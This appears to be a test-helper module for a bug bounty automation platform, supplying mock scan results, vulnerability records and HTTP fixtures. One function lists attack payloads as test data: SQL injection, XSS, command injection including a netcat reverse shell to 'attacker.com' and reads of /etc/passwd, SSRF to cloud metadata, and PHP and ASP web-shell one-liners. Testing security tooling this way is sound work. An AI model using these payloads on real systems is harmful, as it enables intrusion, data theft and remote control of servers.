"""
Test utilities and helper functions for Bug Bounty Automation Platform tests
"""

import json
import uuid
import tempfile
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Any, Optional
from unittest.mock import Mock, patch

from django.test import TestCase
from django.core.files.uploadedfile import SimpleUploadedFile
from django.contrib.auth import get_user_model
from rest_framework.test import APIClient
from rest_framework_simplejwt.tokens import RefreshToken

User = get_user_model()


class TestDataGenerator:
    """Generate test data for various scenarios"""

    @staticmethod
    def generate_scan_results(tool_name: str = 'nuclei', count: int = 5) -> List[Dict]:
        """Generate mock scan results for different tools"""

        if tool_name == 'nuclei':
            return [
                {
                    'template': f'test-template-{i}',
                    'url': f'https://example.com/path{i}',
                    'severity': ['info', 'low', 'medium', 'high', 'critical'][i % 5],
                    'description': f'Test vulnerability {i}',
                    'matched': f'vulnerable pattern {i}',
                    'timestamp': datetime.now().isoformat()
                }
                for i in range(count)
            ]

        elif tool_name == 'nmap':
            return {
                'hosts': [
                    {
                        'ip': f'192.168.1.{10 + i}',
                        'hostname': f'host{i}.example.com',
                        'ports': [
                            {'port': 80 + j, 'protocol': 'tcp', 'state': 'open', 'service': f'http{j}'}
                            for j in range(3)
                        ]
                    }
                    for i in range(count)
                ]
            }

        elif tool_name == 'amass':
            return [
                f'subdomain{i}.example.com'
                for i in range(count)
            ]

        elif tool_name == 'sqlmap':
            return [
                {
                    'url': f'https://example.com/login?id={i}',
                    'parameter': f'param{i}',
                    'payload': f"1' OR '1'='1' -- {i}",
                    'injection_type': 'boolean-based blind',
                    'dbms': 'MySQL',
                    'vulnerable': True
                }
                for i in range(count)
            ]

        else:
            # Generic tool results
            return [
                {
                    'id': i,
                    'result': f'Generic result {i} from {tool_name}',
                    'timestamp': datetime.now().isoformat()
                }
                for i in range(count)
            ]

    @staticmethod
    def generate_vulnerability_data(**kwargs) -> Dict[str, Any]:
        """Generate realistic vulnerability data"""
        defaults = {
            'vulnerability_name': 'SQL Injection in Login Form',
            'vulnerability_type': 'sql_injection',
            'owasp_category': 'A03',
            'cwe_id': 'CWE-89',
            'severity': 'high',
            'cvss_score': 8.1,
            'impact_description': 'Potential data breach and unauthorized access',
            'affected_url': 'https://example.com/login',
            'affected_parameter': 'username',
            'http_method': 'POST',
            'payload_used': "admin' OR '1'='1' --",
            'discovered_by_tool': 'sqlmap',
            'discovery_method': 'automated_parameter_fuzzing',
            'confidence_level': 0.9,
            'remediation_suggestion': 'Use parameterized queries'
        }
        defaults.update(kwargs)
        return defaults

    @staticmethod
    def generate_exploitation_payloads(vuln_type: str) -> List[str]:
        """Generate realistic exploitation payloads for different vulnerability types"""

        payloads = {
            'sql_injection': [
                "admin' OR '1'='1' --",
                "' UNION SELECT 1,2,3,4,5 --",
                "'; DROP TABLE users; --",
                "admin'/**/OR/**/1=1#",
                "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(0x7e,0x27,CAST(USER() AS CHAR),0x27,0x7e) x FROM information_schema.tables GROUP BY x)a) --"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')></iframe>"
            ],
            'command_injection': [
                "; cat /etc/passwd",
                "| whoami",
                "&& ls -la",
                "; ping -c 4 attacker.com",
                "| nc attacker.com 4444 -e /bin/sh"
            ],
            'ssrf': [
                "http://localhost:8080/admin",
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd",
                "http://internal.company.com:3000",
                "gopher://localhost:6379/_INFO"
            ],
            'file_upload': [
                "<?php system($_GET['cmd']); ?>",
                "<%@ page import=\"java.io.*\" %>",
                "<script>alert('File Upload XSS')</script>",
                "<?php phpinfo(); ?>",
                "<%eval request('cmd')%>"
            ]
        }

        return payloads.get(vuln_type, ['generic_payload'])

    @staticmethod
    def generate_http_request(method: str = 'POST', url: str = 'https://example.com/test') -> str:
        """Generate realistic HTTP request data"""

        headers = [
            f"{method} {url} HTTP/1.1",
            "Host: example.com",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate",
            "Connection: keep-alive",
            "Content-Type: application/x-www-form-urlencoded"
        ]

        if method in ['POST', 'PUT', 'PATCH']:
            body = "username=admin&password=test123"
            headers.append(f"Content-Length: {len(body)}")
            headers.extend(["", body])

        return "\n".join(headers)

    @staticmethod
    def generate_http_response(status_code: int = 200, content_type: str = 'text/html') -> str:
        """Generate realistic HTTP response data"""

        headers = [
            f"HTTP/1.1 {status_code} {'OK' if status_code == 200 else 'Error'}",
            f"Content-Type: {content_type}",
            "Server: nginx/1.18.0",
            "Date: " + datetime.now().strftime("%a, %d %b %Y %H:%M:%S GMT"),
            "Connection: keep-alive"
        ]

        if status_code == 200:
            body = """<html>
<head><title>Test Page</title></head>
<body>
    <h1>Welcome to Test Page</h1>
    <p>This is a test response.</p>
</body>
</html>"""
        else:
            body = f"""<html>
<head><title>Error {status_code}</title></head>
<body>
    <h1>Error {status_code}</h1>
    <p>An error occurred processing your request.</p>
</body>
</html>"""

        headers.append(f"Content-Length: {len(body)}")
        headers.extend(["", body])

        return "\n".join(headers)


class MockToolExecutor:
    """Mock tool executor for testing tool integrations"""

    def __init__(self, tool_name: str):
        self.tool_name = tool_name
        self.mock_results = TestDataGenerator.generate_scan_results(tool_name)

    def execute(self, *args, **kwargs) -> Dict[str, Any]:
        """Mock tool execution"""
        return {
            'success': True,
            'return_code': 0,
            'stdout': json.dumps(self.mock_results),
            'stderr': '',
            'execution_time': 45.2,
            'command': f"{self.tool_name} -u example.com"
        }

    def set_failure(self, error_message: str = "Tool execution failed"):
        """Configure mock to simulate failure"""
        self.mock_failure = True
        self.error_message = error_message

    def set_results(self, results: Any):
        """Set custom results for the mock"""
        self.mock_results = results


class EvidenceFileHelper:
    """Helper for creating test evidence files"""

    @staticmethod
    def create_screenshot_file(filename: str = 'test_screenshot.png') -> SimpleUploadedFile:
        """Create a mock screenshot file for testing"""
        # Create a minimal PNG file (1x1 pixel)
        png_data = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\tpHYs\x00\x00\x0b\x13\x00\x00\x0b\x13\x01\x00\x9a\x9c\x18\x00\x00\x00\nIDATx\x9cc```\x00\x00\x00\x04\x00\x01\xdd\xcc\xdb\x00\x00\x00\x00IEND\xaeB`\x82'
        return SimpleUploadedFile(filename, png_data, content_type='image/png')

    @staticmethod
    def create_log_file(filename: str = 'test_log.txt', content: str = None) -> SimpleUploadedFile:
        """Create a mock log file for testing"""
        if content is None:
            content = f"""[{datetime.now().isoformat()}] INFO: Starting scan
[{datetime.now().isoformat()}] INFO: Target: https://example.com
[{datetime.now().isoformat()}] WARN: Rate limiting detected
[{datetime.now().isoformat()}] ERROR: Connection timeout
[{datetime.now().isoformat()}] INFO: Scan completed"""

        return SimpleUploadedFile(filename, content.encode('utf-8'), content_type='text/plain')

    @staticmethod
    def create_report_file(filename: str = 'test_report.json', data: Dict = None) -> SimpleUploadedFile:
        """Create a mock report file for testing"""
        if data is None:
            data = {
                'scan_id': str(uuid.uuid4()),
                'target': 'https://example.com',
                'vulnerabilities_found': 5,
                'scan_duration': '00:45:30',
                'timestamp': datetime.now().isoformat()
            }

        content = json.dumps(data, indent=2)
        return SimpleUploadedFile(filename, content.encode('utf-8'), content_type='application/json')


class DatabaseTestMixin:
    """Mixin for database-related test utilities"""

    def assert_model_fields(self, instance, expected_fields: Dict[str, Any]):
        """Assert that model instance has expected field values"""
        for field_name, expected_value in expected_fields.items():
            actual_value = getattr(instance, field_name)
            self.assertEqual(
                actual_value,
                expected_value,
                f"Field '{field_name}' expected {expected_value}, got {actual_value}"
            )

    def assert_model_count(self, model_class, expected_count: int):
        """Assert that model has expected number of instances"""
        actual_count = model_class.objects.count()
        self.assertEqual(
            actual_count,
            expected_count,
            f"Expected {expected_count} {model_class.__name__} instances, got {actual_count}"
        )

    def assert_relationship_exists(self, parent_instance, child_field: str, expected_count: int = None):
        """Assert that relationship exists and optionally has expected count"""
        related_manager = getattr(parent_instance, child_field)

        if expected_count is not None:
            actual_count = related_manager.count()
            self.assertEqual(
                actual_count,
                expected_count,
                f"Expected {expected_count} related {child_field}, got {actual_count}"
            )
        else:
            # Just check that the relationship exists
            self.assertTrue(
                related_manager.exists(),
                f"No related {child_field} found"
            )


class APITestMixin:
    """Mixin for API-related test utilities"""

    def assert_api_response(self, response, expected_status: int, expected_fields: List[str] = None):
        """Assert API response has expected status and fields"""
        self.assertEqual(
            response.status_code,
            expected_status,
            f"Expected status {expected_status}, got {response.status_code}. Response: {response.content}"
        )

        if expected_fields and response.status_code < 400:
            try:
                data = response.json()
                for field in expected_fields:
                    self.assertIn(
                        field,
                        data,
                        f"Expected field '{field}' not found in response: {data}"
                    )
            except (ValueError, TypeError):
                self.fail(f"Response is not valid JSON: {response.content}")

    def assert_api_error(self, response, expected_status: int, error_message: str = None):
        """Assert API response has expected error status and optionally message"""
        self.assertEqual(response.status_code, expected_status)

        if error_message:
            try:
                data = response.json()
                response_text = str(data)
                self.assertIn(
                    error_message.lower(),
                    response_text.lower(),
                    f"Expected error message '{error_message}' not found in response: {data}"
                )
            except (ValueError, TypeError):
                # Check in response content if not JSON
                self.assertIn(
                    error_message.lower(),
                    response.content.decode().lower()
                )

    def perform_authenticated_request(self, client: APIClient, user, method: str, url: str, data: Dict = None):
        """Perform an authenticated API request"""
        # Authenticate user
        refresh = RefreshToken.for_user(user)
        client.credentials(HTTP_AUTHORIZATION=f'Bearer {refresh.access_token}')

        # Perform request
        method_func = getattr(client, method.lower())
        if data:
            if method.upper() in ['POST', 'PUT', 'PATCH']:
                return method_func(url, data, format='json')
            else:
                return method_func(url, data)
        else:
            return method_func(url)


class ScanTestHelper:
    """Helper for creating scan-related test scenarios"""

    @staticmethod
    def create_scan_scenario(target, tools: List[str] = None, with_vulnerabilities: bool = True):
        """Create a complete scan scenario with tools and optionally vulnerabilities"""
        from tests.factories import (
            ScanSessionFactory, ToolExecutionFactory, VulnerabilityFactory
        )

        if tools is None:
            tools = ['nuclei', 'nmap', 'amass']

        # Create scan session
        scan_session = ScanSessionFactory.create(
            target=target,
            scan_config={'tools': tools, 'intensity': 'medium'}
        )

        # Create tool executions
        tool_executions = []
        for tool in tools:
            execution = ToolExecutionFactory.create(
                scan_session=scan_session,
                tool_name=tool,
                status='completed'
            )
            tool_executions.append(execution)

        # Create vulnerabilities if requested
        vulnerabilities = []
        if with_vulnerabilities:
            vulnerabilities = VulnerabilityFactory.create_batch(
                3, scan_session=scan_session
            )

        return {
            'scan_session': scan_session,
            'tool_executions': tool_executions,
            'vulnerabilities': vulnerabilities
        }


class ExploitationTestHelper:
    """Helper for creating exploitation test scenarios"""

    @staticmethod
    def create_exploitation_scenario(vulnerability, success: bool = True):
        """Create an exploitation scenario with results"""
        from tests.factories import (
            ExploitationSessionFactory, ExploitResultFactory
        )

        # Create exploitation session
        session = ExploitationSessionFactory.create(
            vulnerability=vulnerability,
            status='successful' if success else 'failed'
        )

        # Create exploit results
        results = []
        for i in range(3):
            result = ExploitResultFactory.create(
                session=session,
                success=success and i < 2,  # 2 out of 3 successful if success=True
                payload=f"test_payload_{i}"
            )
            results.append(result)

        return {
            'session': session,
            'results': results
        }


class TempFileManager:
    """Context manager for temporary file operations in tests"""

    def __init__(self, prefix: str = 'bugbounty_test_'):
        self.prefix = prefix
        self.temp_files = []
        self.temp_dirs = []

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        # Clean up all temporary files and directories
        for temp_file in self.temp_files:
            try:
                if temp_file.exists():
                    temp_file.unlink()
            except Exception:
                pass

        for temp_dir in self.temp_dirs:
            try:
                if temp_dir.exists():
                    import shutil
                    shutil.rmtree(temp_dir)
            except Exception:
                pass

    def create_temp_file(self, content: str = '', suffix: str = '.txt') -> Path:
        """Create a temporary file with content"""
        temp_file = Path(tempfile.mktemp(prefix=self.prefix, suffix=suffix))
        temp_file.write_text(content)
        self.temp_files.append(temp_file)
        return temp_file

    def create_temp_dir(self) -> Path:
        """Create a temporary directory"""
        temp_dir = Path(tempfile.mkdtemp(prefix=self.prefix))
        self.temp_dirs.append(temp_dir)
        return temp_dir


# Test decorators and context managers
def skip_if_no_tools(tools: List[str]):
    """Decorator to skip tests if required tools are not available"""
    import shutil
    from unittest import skipIf

    missing_tools = [tool for tool in tools if not shutil.which(tool)]

    return skipIf(
        bool(missing_tools),
        f"Required tools not available: {', '.join(missing_tools)}"
    )


def mock_external_service(service_name: str, response_data: Any = None):
    """Decorator to mock external service calls"""
    def decorator(func):
        def wrapper(*args, **kwargs):
            with patch(f'services.{service_name}') as mock_service:
                if response_data:
                    mock_service.return_value = response_data
                return func(*args, **kwargs)
        return wrapper
    return decorator


# Global test configuration
class TestConfig:
    """Global test configuration settings"""

    # Test data settings
    DEFAULT_TIMEOUT = 30
    MAX_TEST_EXECUTION_TIME = 300
    TEST_FILE_SIZE_LIMIT = 10 * 1024 * 1024  # 10MB

    # Mock settings
    MOCK_EXTERNAL_REQUESTS = True
    MOCK_FILE_OPERATIONS = True
    MOCK_TOOL_EXECUTION = True

    # Test environment settings
    USE_IN_MEMORY_DATABASE = True
    DISABLE_LOGGING = False
    ENABLE_DEBUG_MODE = False

    @classmethod
    def get_test_settings(cls) -> Dict[str, Any]:
        """Get test-specific Django settings overrides"""
        return {
            'DEBUG': cls.ENABLE_DEBUG_MODE,
            'DATABASES': {
                'default': {
                    'ENGINE': 'django.db.backends.sqlite3',
                    'NAME': ':memory:' if cls.USE_IN_MEMORY_DATABASE else 'test_db.sqlite3',
                }
            },
            'CELERY_TASK_ALWAYS_EAGER': True,
            'CELERY_TASK_EAGER_PROPAGATES': True,
            'EMAIL_BACKEND': 'django.core.mail.backends.locmem.EmailBackend',
            'MEDIA_ROOT': tempfile.mkdtemp(prefix='test_media_'),
            'STATIC_ROOT': tempfile.mkdtemp(prefix='test_static_'),
        }